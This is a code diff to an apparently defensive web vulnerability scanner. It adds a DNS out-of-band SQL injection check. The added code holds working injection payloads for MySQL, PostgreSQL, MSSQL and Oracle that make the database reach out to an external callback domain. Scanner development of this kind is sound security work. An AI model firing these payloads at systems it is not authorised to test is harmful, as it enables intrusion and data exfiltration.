@@ -329,12 +329,53 @@ async def scan_endpoint(client: ScanClient, config: ScanConfig,
                     ))
                     break
 
-        # ---- 4. UNION-based: column discovery -> NULL probe -> version extraction ----
-        # try string context (') then numeric context ('') for ORDER BY / UNION.
-        # ORDER BY n is compared against ORDER BY 1 (not the baseline) with the
-        # echoed payload normalized away (raw, HTML-escaped, URL-encoded forms),
-        # so echoing pages don't false-trigger. A stricter 0.60 similarity bar
-        # is used here because ORDER BY only needs to detect the error cliff.
+        # ---- 4. DNS OOB (third confirmation channel, needs --oob-domain) ----
+        # Only fires when the user supplied a callback domain. Uses DBMS-specific
+        # DNS exfiltration functions. We can't observe the DNS hit from here,
+        # so this is a "likely" signal — reported at lower confidence and only
+        # if no other SQLi was confirmed on this param (avoids noise).
+        sqli_confirmed = any(f.param == param and f.type == "SQL Injection"
+                             for f in findings)
+        if config.oob_domain and not sqli_confirmed:
+            import secrets as _secrets
+            token = _secrets.token_hex(4)
+            oob_target = f"{token}.{config.oob_domain}"
+            OOB_PAYLOADS = [
+                # MySQL: LOAD_FILE triggers DNS via UNC/SMB or DNS lookup
+                f"' AND LOAD_FILE(CONCAT('\\\\\\\\',{_quote(oob_target)},'\\\\a'))-- -",
+                # PostgreSQL: dblink / COPY TO PROGRAM variants (safe: DNS only)
+                f"'; SELECT dblink_connect('host={oob_target} user=a password=a dbname=a')-- -",
+                # MSSQL: xp_dirtree triggers DNS/SMB lookup
+                f"'; EXEC xp_dirtree '\\\\{oob_target}\\a'-- -",
+                # Oracle: UTL_HTTP / DBMS_LDAP
+                f"' AND UTL_HTTP.REQUEST('http://{oob_target}/') IS NOT NULL-- -",
+            ]
+            for payload in OOB_PAYLOADS:
+                resp, full, body_sent, _ = await _send(
+                    client, method, url, params, param, params[param] + payload)
+                if not resp:
+                    continue
+                # OOB is a "shot in the dark" — we report it as a lead only if
+                # the response differs from baseline (error or timing change),
+                # which suggests the DB attempted the lookup
+                db_err = detect_db_error(resp.text) and not detect_db_error(base_body)
+                if db_err:
+                    ev = _evidence(method, full, headers, body_sent, resp)
+                    ev.proof = (f"DNS-OOB payload triggered a DB error — the database "
+                                f"attempted to resolve {oob_target}. Check your DNS logs "
+                                f"for '{token}' to confirm exfiltration.")
+                    findings.append(Finding(
+                        type="SQL Injection", subtype="dns-oob-lead",
+                        cvss_vector="CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                        confidence=0.65, url=full, method=method, param=param,
+                        payload=payload, evidence=ev, cwe="CWE-89",
+                        owasp="A03:2021 – Injection",
+                        remediation=REMEDIATION_SQLI,
+                        references=["https://owasp.org/www-community/attacks/Blind_SQL_Injection"],
+                    ))
+                    break
+
+        # ---- 5. UNION-based ----
         def _norm(body: str, sent_value: str) -> str:
             variants = {
                 sent_value,
